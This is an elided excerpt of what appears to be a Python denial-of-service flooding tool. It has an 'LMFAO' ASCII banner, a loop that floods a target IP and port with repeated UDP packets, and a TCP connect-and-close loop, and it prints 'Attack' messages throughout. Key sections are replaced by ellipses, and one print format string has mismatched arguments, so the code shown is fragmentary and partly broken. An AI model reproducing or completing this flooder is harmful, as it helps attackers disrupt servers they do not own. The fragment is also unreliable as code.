...
\033[95m _     __  __ _____ _    ___  
\033[95m| |   |  \/  |  ___/ \  / _ \ 
\033[95m| |   | |\/| | |_ / _ \| | | |
\033[95m| |___| |  | |  _/ ___ \ |_| |
\033[95m|_____|_|  |_|_|/_/   \_\___/ ░
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print("  Server %s Attack %s"%(ip,port))
		except:
			print("  Server %s Attack %s"%(ip,port))
...
def tcp():
	...
	while True:
		try:
			...
			s.close()
			print("\033[1;31;40m Attack Server %s"%(ip,port))
